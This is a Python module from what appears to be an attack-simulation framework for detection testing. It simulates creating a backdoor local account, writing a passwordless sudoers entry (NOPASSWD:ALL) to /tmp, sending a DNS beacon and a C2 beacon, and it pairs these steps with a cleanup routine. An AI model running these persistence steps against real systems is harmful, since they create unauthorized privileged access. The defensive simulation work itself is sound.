# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""
Attack: account_backdoor — Persistence / Privilege Escalation
T1136 Create Account
T1136.001 Create Account: Local Account
T1098 Account Manipulation

SAFE simulation: creates a clearly-labelled throwaway account inside the
isolated victim container, then the cleanup step immediately removes it.
No account persists beyond the cleanup phase.
"""

from __future__ import annotations

from typing import Any

from gloamfire.attacks.base import AttackResult, BaseAttack
from gloamfire.core.registry import register

_DNS_BEACON_DOMAIN = "backdoor-sim.gloamfire.invalid"
_BACKDOOR_USER = "gloamfire_sim_user"
_SUDOERS_LINE = f"{_BACKDOOR_USER} ALL=(ALL) NOPASSWD:ALL"
_SUDOERS_FILE = f"/tmp/gloamfire_sudoers_sim"


@register
class AccountBackdoorAttack(BaseAttack):
    name = "account_backdoor"
    description = "Simulate backdoor account creation and sudoers manipulation (T1136, T1098)"
    mitre = ["T1136", "T1136.001", "T1098"]

    def execute(self, target: str, params: dict[str, Any]) -> AttackResult:
        user = params.get("backdoor_user", _BACKDOOR_USER)
        resolver = params.get("resolver", "8.8.8.8")

        script = f"""
echo "[Gloamfire] Account backdoor simulation starting"

# T1136.001 — create local account
useradd -m -s /bin/bash -c "Gloamfire simulation account" {user} 2>/dev/null || true
echo "[Gloamfire] Account '{user}' created: $(id {user} 2>/dev/null || echo 'failed')"

# T1098 — account manipulation: write simulated sudoers entry to /tmp (safe)
echo "{_SUDOERS_LINE}" > {_SUDOERS_FILE}
echo "[Gloamfire] Simulated sudoers entry written to {_SUDOERS_FILE}"

# Show what a real attacker would do (but don't write to real sudoers.d)
echo "[Gloamfire] NOTE: In real attack, would write to /etc/sudoers.d/ (simulated only)"
echo "[Gloamfire] Account backdoor simulation complete"
"""
        result = self._exec(target, script)
        result.metadata["backdoor_user"] = user

        self._exec(target, f"nslookup {_DNS_BEACON_DOMAIN} {resolver} 2>/dev/null || true")
        self._c2_beacon(target)
        self._write_attack_log(target, self.name)
        return result


@register
class AccountBackdoorCleanup(BaseAttack):
    name = "account_backdoor_cleanup"
    description = "Remove simulated backdoor account and artefacts"
    mitre = []

    def execute(self, target: str, params: dict[str, Any]) -> AttackResult:
        user = params.get("backdoor_user", _BACKDOOR_USER)
        return self._exec(
            target,
            f"userdel -r {user} 2>/dev/null || true; rm -f {_SUDOERS_FILE}",
        )
